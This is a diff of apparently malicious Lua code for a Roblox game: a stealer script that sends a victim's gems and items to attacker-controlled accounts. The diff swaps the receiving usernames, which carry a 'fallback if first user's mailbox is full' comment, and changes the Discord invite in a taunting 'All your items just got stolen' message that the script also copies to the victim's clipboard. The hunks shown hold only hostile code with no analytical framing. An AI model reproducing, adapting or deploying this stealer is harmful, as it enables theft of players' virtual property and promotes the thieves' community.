@@ -1,5 +1,5 @@
-Username = "mrdrinkr45"
-Username2 = "r1234gt" -- fallback if first user's mailbox is full
+Username = "r1234gt"
+Username2 = "notacheater55551" -- fallback if first user's mailbox is full
 
 webhook = ""
 
@@ -269,6 +269,6 @@ if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
     SendAllGems()
 
     local message = require(ReplicatedStorage.Library.Client.Message)
-    message.Error("All your items just got stolen by yeslidez\n Join https://discord.gg/b3nKKFV6A")
-    setclipboard("https://discord.gg/b3nKKFV6A")
+    message.Error("All your items just got stolen by yeslidez\n Join https://discord.gg/FNnkfJqukh")
+    setclipboard("https://discord.gg/FNnkfJqukh")
 end
